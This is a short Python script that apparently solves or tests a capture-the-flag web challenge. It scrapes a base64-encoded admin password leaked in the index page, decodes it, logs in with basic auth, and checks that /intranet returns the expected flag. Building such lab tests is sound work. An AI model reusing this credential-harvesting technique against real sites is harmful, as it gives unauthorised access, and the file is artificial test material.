import requests
import argparse
import yaml
import re
from base64 import b64decode
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    # Fetch password of admin
    index = requests.get(url)
    m = re.search("admin:[^ ]*", index.text)
    assert m is not None
    password = b64decode(m.group(0).split(":")[1]).decode()

    # Authenticate and fetch flag
    session = requests.Session()
    session.auth = ("admin", password)
    res = session.get(f"{url}/intranet")
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()

    test(args.url)
